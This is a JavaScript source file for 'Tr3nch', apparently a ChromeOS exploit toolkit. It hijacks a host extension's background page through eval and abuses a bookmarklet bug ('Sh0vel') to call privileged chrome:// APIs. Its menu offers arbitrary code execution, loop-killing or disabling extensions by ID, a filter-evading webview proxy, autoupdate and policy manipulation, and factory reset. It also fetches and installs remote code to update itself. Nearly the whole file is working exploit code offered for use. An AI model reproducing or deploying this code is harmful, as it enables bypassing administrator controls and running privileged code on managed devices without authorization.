chrome.runtime.getBackgroundPage((background) => {
	function payload() {
		chrome.runtime.onMessage.addListener(function(message) {
			switch(message.cmd) {
				case "runCode":
					/* Since we're the background page, we'll want to be able to run code from the menu, and
					it just so happens Sh0vel requires eval, soooooo...*/
					eval(message.code);
					break;
				case "update":
					/* Most of this was ripped from installer.js */
					webkitRequestFileSystem(TEMPORARY, 1024 * 1024 * 300, async function(fs) {
						function writeFile(name, data) {
							return new Promise((resolve) => {
								fs.root.getFile(name, {create: true}, function (entry) {
									entry.createWriter(function (writer) {
										writer.write(new Blob([data]));
                    					writer.onwriteend=function() {
											resolve(entry);
										}
									});
								});
							});
						}
						function removeFile(name) {
							return new Promise(function (resolve) {
								fs.root.getFile(name, {create: true}, function (entry) {
									entry.remove(resolve);
								});
							});
						}
						function downloadFile(source, name) {
							return new Promise((resolve) => {
								fetch(source).then(res => res.text()).then(async (data) => {
									await removeFile(name);
									await writeFile(name, data);
								});
							});
						}

						/* It's important we don't execute if wifi is off, because 
						writing an invalid fetch request wipes the entire file */
						if (navigator.onLine) { 
							console.log("Updating Tr3nch");
							await writeFile('<script src="tr3nch.js"></script>', "tr3nch.html"); /* We'll want to reinstall the HTML loader in case it's broken */
							await downloadFile("https://raw.githubusercontent.com/Whelement/Tr3nch/main/tr3nch.js","tr3nch.js");
						}else{
							console.error("Cannot update Tr3nch, wifi is disconnected.");
						}
					});
					break;
				case "disable":
					chrome.management.get(chrome.runtime.id, (cur) => {
						chrome.management.setEnabled(message.id, !message.disable);
					});
					break;
			}
		});
		chrome.browserAction.enable(); /* Some extensions like to be silly and disable browserAction */
		chrome.browserAction.onClicked.addListener(function() {
			function tabPayload() {
				if (!tr3nch) {
					var tr3nch=true;
				}else{
					return;
				} /* Don't inject Tr3nch twice. */
				
				/* asPage is what really ties everything together, with bookmarklets having a bug that
				lets us run code outside of the content script's boundaries. This has been dubbed
				"sh0vel", and we can use it to not only access private chrome APIs, but also Mojo and WEBUI.*/
				const asPage=function(code) {
					let link=window.open('about:blank','_blank');
					link.location.href=`javascript:(function() {chrome=opener.chrome;${code}})();`;
					/* We don't call link.close here as some callbacks need to run before closing, so
					ALL asPage calls need to have window.close be the last thing that runs unless you need the extra tab */
				}
				/* For convenience, we'll want to run code as the extension too, as it may also
				have useful permissions that can be exploited.*/
				const asExt=function(code) {
					chrome.runtime.sendMessage(chrome.runtime.id, {cmd: "runCode", code: code});
				}

				/* Here we load in the base GUI, the options will be filled in later by loadMenuItems. */
				const loadMenuHTML=function() {
					/* I suck at css lmao */
					const menuHTML=`
					<div class="topBar">
						<h1>Tr3nch</h1>
						<a href="https://whelement.me" target="_blank">Whelement Homepage</a>
						<a href="https://discord.gg/fPU8cUvf" target="_blank">Whelement Discord</a>
						<a href="https://github.com/Whelement/Tr3nch" target="_blank">Source Code</a>
						<button id="update">Update Tr3nch</button>
						<button id="unload">Deload Tr3nch</button>
					</div>
					<div id="opt-container"></div>
					<div class="credits">
						<h1>Credits</h1>
						<p1>Developed and brought to you by Whelement.</p1>
						<p>
							Zeglol1234: The idea, main developer<br>
							Writable: Skiovox Breakout implementations (Not affiliated with this project directly)<br>
							Bypassi: Add gmails exploit (Not affiliated with this project directly)<br>
							Boeing: Misc development and testing<br>
							Kxtz: Misc development and testing<br>
							Archimax: GUI inspiration<br>
							Kelsea: The logo<br>
							Katie: Testing<br>
							The rest of Whelement: Mental support<br>
						</p>
					</div>
					<style>
						body{
							margin: 0px;
							padding: 0px;
							font-family: monospace;
							background-color: #2c3e50;
							color: white;
						}
						.topBar{
							width: 100%;
							height: 100px;
							background-color: #2c3e50;
							text-align: center;
						}
						.credits{
							width: 100%;
							height: 250px;
							background-color: #2c3e50;
							text-align: center;
						}
						#opt-container{
							background-color: #1d2936;
							text-align: center;
						}
						textarea{
							height: 200px;
							width: 550px;
							color: white;
							padding: 10px;
							background-color: #000;
							border-radius: 20px;
							border: 3px solid white;
						}
						input{
							height: 20px;
							width: 300px;
							color: white;
							padding: 10px;
							background-color: #000;
							border-radius: 20px;
							border: 3px solid white;
						}
						h1{
							cursor: default;
							font-size: 40px;
							font-weight: bold;
							margin-bottom: 0px;
						}
						hr{
							width: 750px;
						}
						button{
							height: 40px;
							padding: 10px;
							margin: 3px;
							border-radius: 20px;
							border: 3px solid white;
							color: white;
							background-color: #2c3e50;
							font-weight: bold;
						}
						button:hover{
							cursor: pointer;
							background-color: #1d2936;
						}
						p{
							cursor: default;
							color: white;
						}
						p1{
							cursor: default;
							font-size: 17px;
							font-weight: bold;
						}
						a{
							font-weight: bold;
							color: white;
						}
					</style>
					`;
					
					document.head.innerText=""; /* Clear any remaining CSS and JS */
					
					/* Fix some issues with the OOBE */
					document.head=document.createElement('head');
					document.body=document.createElement('body');

					document.title="Tr3nch";
					document.body.innerHTML=menuHTML;
				}

				/* Check what the full extent of our permissions are based off the origin. */
				const checkPerms=function() {
					/* We use window.origin so url parameters can't break the menu */
					if (!window.origin.includes("chrome:")) return null;

					switch(window.origin.replace("chrome://","")) {
						case "oobe":
							return [
								"unenroll",
								"update",
								"webViewProxy",
								"reboot"
							];
							break;
						case "extensions":
							return ["killExtensions"];
							break;
						case "os-settings":
							return [
								"manageNetworks",
								"addAccounts",
								"siteSettings",
								"update",
								"restart",
								"webViewProxy",
								"disableExtensions"
							];
							break;
						case "settings":
							return [
								"addAccounts",
								"siteSettings",
								"update",
								"restart",
								"disableExtensions"
							];
							break;
						case "file-manager":
							return [
								"webViewProxy",
								"files"
							];
							break
						case "chrome-signin":
							return ["webViewProxy"];
							break;
						case "network":
							return ["manageNetworks"];
							break;
						case "policy":
							return ["policies"];
							break;
						default:
							/* If a page isn't here, its permissions are not considered useful. */
							return null;
							break;
					}
				}

				/* Get available permissions and make a container filled with menu options, then return it. */
				const loadMenuItems=function() {
					let perms=checkPerms();
					let container=document.createElement('div');

					/*=================================================================
					Permission Independent Options
					Put options that don't need specific page permissions here
					=================================================================*/
					
					let extEvalBox=document.createElement('div');
					/* We can use innerHTML because we inherit the CSP from our extension */
					extEvalBox.innerHTML=`
					<br>
					<h1>Run Code As Background Page</h1>
					<hr>
					<p>Run code directly as the background page of the extension Tr3nch is injected into</p>
					<textarea id="extEvalBox"></textarea>
					<br>
					<button id="extEvalButton">Run as Background</button>
					`;
					extEvalBox.querySelector('#extEvalButton').addEventListener('click', () => {
						asExt(document.querySelector('#extEvalBox').value);
					});
					container.append(extEvalBox);

					let pbEvalBox=document.createElement('div');
					pbEvalBox.innerHTML=`
					<br>
					<h1>Run Code As Sh0vel</h1>
					<hr>
					<p>Run code with direct access to this page's chrome API via Sh0vel. Access this page's DOM with window.opener.</p>
					<textarea id="pbEvalBox"></textarea>
					<br>
					<button id="pbEvalButton">Run as Sh0vel</button>
					`;
					pbEvalBox.querySelector('#pbEvalButton').addEventListener('click', () => {
						asPage(document.querySelector('#pbEvalBox').value);
					});
					container.append(pbEvalBox);

					let pageEvalBox=document.createElement('div');
					pageEvalBox.innerHTML=`
					<br>
					<h1>Run Code On This Page</h1>
					<hr>
					<p>Run code directly as this content script without chrome API access.</p>
					<textarea id="pageEvalBox"></textarea>
					<br>
					<button id="pageEvalButton">Run as Page</button>
					`;
					pageEvalBox.querySelector('#pageEvalButton').addEventListener('click', () => {
						eval(document.querySelector('#pageEvalBox').value);
					});
					container.append(pageEvalBox);

					/*=================================================================
					Permission Dependent Options
					Put options that DO need specific page permissions here
					=================================================================*/
					
					if (chrome.runtime.getManifest().permissions.includes("management")) {
						let disableBox=document.createElement('div');
						disableBox.innerHTML=`
						<br>
						<h1>Fully Disable/Enable Extensions</h1>
						<hr>
						<p>Fully disable/enable any extension by its ID.</p>
						<label>
							<input id="disableIdBox" placeholder="Extension ID Here">
						</label>
						<br>
						<button id="disableIdButton">Disable Extension</button>
						<button id="enableIdButton">Enable Extension</button>
						`;
						disableBox.querySelector('#disableIdButton').addEventListener('click', () => {
							/* Unfortunately we are still a content script, so we do have to play by the rules :( */
							chrome.runtime.sendMessage(chrome.runtime.id, {
								cmd: 'disable', 
								id: document.querySelector('#disableIdBox').value,
								disable: true
							});
						});
						disableBox.querySelector('#enableIdButton').addEventListener('click', () => {
							chrome.runtime.sendMessage(chrome.runtime.id, {
								cmd: 'disable', 
								id: document.querySelector('#disableIdBox').value,
								disable: false
							});
						});

						container.append(disableBox);
					}

					if (perms == null) {
						asExt('alert("The page you\'re attempting to run Tr3nch on is not priveledged. Please run this on a url starting with \'chrome://\'.");');
						return container; /* For unpriveledged pages extension permissions are still accessible, so stop only after loading them in. */
					}
					
					if (perms.includes("update")) {
						let updateBox=document.createElement('div');
						updateBox.innerHTML=`
						<br>
						<h1>Update Manager</h1>
						<hr>
						<p>Force, Disable, and Enable automatic updates for the OS.</p>
						<button id="updateOS">Update System</button>
						<button id="caub">Disable Consumer Autoupdates</button>
						<button id="uncaub">Enable Consumer Autoupdates</button>
						`;
						updateBox.querySelector('#updateOS').addEventListener('click', () => {
							asPage("chrome.send('requestUpdate');window.close();");
						});
						updateBox.querySelector('#caub').addEventListener('click', () => {
							asPage("chrome.send('setConsumerAutoUpdate', ['false']);window.close();");
						});
						updateBox.querySelector('#uncaub').addEventListener('click', () => {
							asPage("chrome.send('setConsumerAutoUpdate', ['true']);window.close();");
						});
						container.append(updateBox);
					}
					if (perms.includes("restart")) {
						let restartBox=document.createElement('div');
						restartBox.innerHTML=`
						<br>
						<h1>User Session Management</h1>
						<hr>
						<p>Reset, exit, or wipe the current user session.</p>
						`;

						let restart=document.createElement('button');
						restart.innerText="Restart Chrome";
						restart.addEventListener('click', () => {
							asPage("chrome.send('restart');window.close();");
						});
						restartBox.append(restart);

						let signOut=document.createElement('button');
						signOut.innerText="Sign Out";
						signOut.addEventListener('click', () => {
							asPage("chrome.send('signOutAndRestart');window.close();");
						});
						restartBox.append(signOut);

						let powerwash=document.createElement('button');
						powerwash.innerText="Powerwash";
						powerwash.addEventListener('click', () => {
							if (confirm("Note: THIS WILL DELETE ALL USERDATA! ARE YOU SURE?!")) {
								/* For those curious, false here prevents a tpm firmware update */
								asPage("chrome.send('factoryReset', ['false']);window.close();");
							}
						});
						restartBox.append(powerwash);

						let attemptUserExit=document.createElement('button');
						attemptUserExit.innerText="Attempt User Exit";
						attemptUserExit.addEventListener('click', () => {
							asPage("chrome.send('AttemptUserExit');");
						});
						restartBox.append(attemptUserExit);

						container.append(restartBox);
					}
					if (perms.includes("files")) {
						let fileBox=document.createElement('div');
						fileBox.innerHTML=`
						<br>
						<h1>Misc Options</h1>
						<hr>
						<p>Various options for the fileManagerPrivate permission.</p>
						<button id="reauth">Signout and Reauthenticate</button>
						`; /* More options to be added soon hopefully, otherwise ill just make a "random" section. */
						
						fileBox.querySelector('#reauth').addEventListener('click', () => {
							asPage("chrome.fileManagerPrivate.logoutUserForReauthentication();");
						});
						
						container.append(fileBox);
					}
					if (perms.includes("addAccounts")) {
						let accBox=document.createElement('div');
						accBox.innerHTML=`
						<br>
						<h1>Manage Accounts</h1>
						<hr>
						<p>Mess around with profiles on the current user session.</p>
						`;

						let addAccButton=document.createElement('button');
						addAccButton.innerText="Add User Gmail";
						addAccButton.addEventListener('click', () => {
							asPage("chrome.send('TurnOffSync');window.close();");
							/* window.open has a few problems, lets use tabs.create instead. */
							asExt("chrome.tabs.create({url: 'https://tinyurl.com/addSession'});");
						});
						accBox.append(addAccButton);

						let addProfile=document.createElement('button');
						addProfile.innerText="Add Profile Dialog";
						addProfile.addEventListener('click', () => {
							asPage("chrome.send('addAccount');window.close();");
						});
						accBox.append(addProfile);

						container.append(accBox);
					}
					if (perms.includes("policies")) {
						let policyBox=document.createElement('div');
						policyBox.innerHTML=`
						<br>
						<h1>Policies</h1>
						<hr>
						<p>Sync and export policies.</p>
						<button id="relPolicy">Policy Sync</button>
						<button id="exPolicy">Export Policies</button>
						`;

						policyBox.querySelector('#relPolicy').addEventListener('click', () => {
							asPage("chrome.send('reloadPolicies');window.close();");
						});
						policyBox.querySelector('#exPolicy').addEventListener('click', () => {
							asPage("chrome.send('exportPoliciesJSON');window.close();");
						});

						container.append(policyBox);
					}
					if (perms.includes("manageNetworks")) {
						let netBox=document.createElement('div');
						netBox.innerHTML=`
						<br>
						<h1>Network Settings</h1>
						<hr>
						<p>Mess around with internet settings.</p>
						<button id="bringUp">Turn Network On</button>
						`;
						netBox.querySelector('#bringUp').addEventListener('click', () => {
							asPage("chrome.networkingPrivate.enableNetworkType('All');window.close();");
						});

						if (window.origin.includes("settings")) {
							let diag=document.createElement('button');
							diag.innerText="Open Diagnostics";
							diag.addEventListener('click', () => {
								asPage("chrome.send('openDiagnostics');window.close();");
							});

							netBox.append(diag);
						}
						
						container.append(netBox);
					}
					if (perms.includes("webViewProxy")) {
						let proxyBox=document.createElement('div');
						proxyBox.innerHTML=`
						<br>
						<h1>Webview Proxy Spawner</h1>
						<hr>
						<p>Open an unblocked webview tab invisible to some filters.</p>
						<label>
							<input id="proxyUrlBox" value="https://www.google.com/">
						</label>
						<br>
						<button id="proxyUrlButton">Launch Webview</button>
						`;
						proxyBox.querySelector('#proxyUrlButton').addEventListener('click', () => {
							/* Thanks bypassi, for the broken SWA window.open bypass! */
							let proxy=window.open("invalid:url", '_blank'); /* This is intentionally broken */
							asExt(`chrome.tabs.update({url: "${window.origin}"});chrome.tabs.reload();`);
							
							proxy.onload=function() {
								proxy.document.head.innerText="";
								
								/* Fix problems with the OOBE */
								proxy.document.head=document.createElement('head');
								proxy.document.body=document.createElement('body');

								proxy.document.title="Tr3nch Webview";
								/* Insecure html injection my beloved <3 */
								proxy.document.body.innerHTML=`
								<div class="webviewContainer">
									<webview allowscaling="" src="${document.querySelector('#proxyUrlBox').value}"></webview>
								</div>
								<style>
									.webviewContainer{
										width: 100%;
										height: 100vh;
									}
									body{
										margin: 0px;
									}
									webview, iframe{
										height: 100%;
										width: 100%;
									}
								</style>
								`;
							}
						});

						container.append(proxyBox);
					}
					if (perms.includes("killExtensions")) {
						let killBox=document.createElement('div');
						killBox.innerHTML=`
						<br>
						<h1>Extension LoopKiller</h1>
						<hr>
						<p>Restart or Repeatedly kill an extension by its ID.</p>
						<label>
							<input id="killIdBox" placeholder="Extension ID Here">
						</label>
						<br>
						<button id="killIdButton">LoopKill Extension</button>
						<button id="resIdButton">Restart Extension</button>
						`;
						killBox.querySelector('#killIdButton').addEventListener('click', () => {
							let id=document.querySelector('#killIdBox').value;
							function disable(id) {
								/* Everything here runs on about:blank! */
								document.body.innerHTML="<h1>Do not close this page! It is keeping your extension disabled.</h1>";
								let ret=true;
								console.log(`Disabling extension by ID: ${id}`);
								setInterval(() => {
									ret=!ret;
									chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: ret});
								}, 3000);
							}
							asPage(`${disable.toString()};disable('${id}');`);
						});
						killBox.querySelector('#resIdButton').addEventListener('click', () => {
							let id=document.querySelector('#killIdBox').value;
							function restart(id) {
								/* We want this to work on managed extensions, so reset its configuration to kill it. */
								chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: false});
								chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: true});
								window.close(); /* We don't want the extra page. */
							}
							asPage(`${restart.toString()};restart('${id}');`);
						});

						container.append(killBox);
					}
					container.append(document.createElement('br')); /* Whitespace just to make me feel better */
					
					return container;
				}

				loadMenuHTML(); /* Load in the base menu */
				let mainContainer=document.querySelector('#opt-container');

				if (mainContainer == null) {
					/* For testing */
					asExt("alert('No GUI container was found, Tr3nch cannot be loaded in.');");
					return;
				}
				mainContainer.append(loadMenuItems()); /* Create a container for all options and append them */

				document.querySelector('#update').addEventListener('click', () => {
					chrome.runtime.sendMessage(chrome.runtime.id, {cmd: "update"});
				});
				document.querySelector('#unload').addEventListener('click', () => {
					/* Close the menu and reload the background page, clearing all traces of Tr3nch */
					asExt('chrome.tabs.getSelected((cur) => {chrome.tabs.remove(cur.id);location.reload();});');
				});
			} /* As Page */

			console.log("Injecting Tr3nch into current page");

			chrome.tabs.getSelected((cur) => {
				if (cur.url.includes("webstore")) {
					alert("Tr3nch cannot operate on the chrome webstore.");
					/* For those curious why, tabs.executeScript has a special case where it will
					refuse to run on the webstore, making Tr3nch impossible to inject into it. */
					return;
				}
				/* I would LOVE to use MV3's function injection capabilities, but because Sh0vel relies entirely on MV2,
				we can't do that, so let's do it my way. */
				chrome.tabs.executeScript(null, {code: `${tabPayload.toString()};tabPayload();`}); /* cur.id over null seems to be buggy */
				/* If you're wondering why I reiterated tabPayload() at the end, it's because the 
				.toString() method in this case only defines the function in the page, it still needs to be called manually. */
			});
		}); /* On Clicked */
		
		console.log('Tr3nch injected into current extension.');
	} /* As Background Page */

	let manifest=chrome.runtime.getManifest();
	if (!manifest.browser_action) {
		alert("Current extension does not have browserAction permissions, cannot continue.");
		return;
	}
	/* The quotations prevent it from accepting 'wasm-unsafe-eval' which won't work */
	if (!manifest.content_security_policy.includes("'unsafe-eval'")) { 
		alert("Current extension does not have permission to use eval, cannot continue.");
		return;
	}
	/* Cool perk of sh0vel: The extension requires eval to work, so we can run code directly
	as the background page to get persistence until the extension restarts */
	if (background.location.href !== location.href) {
		background.eval(`${payload.toString()};payload();`);
	}else{
		payload(); /* If this is already running as the background page then we don't need to use eval. */
	}
});
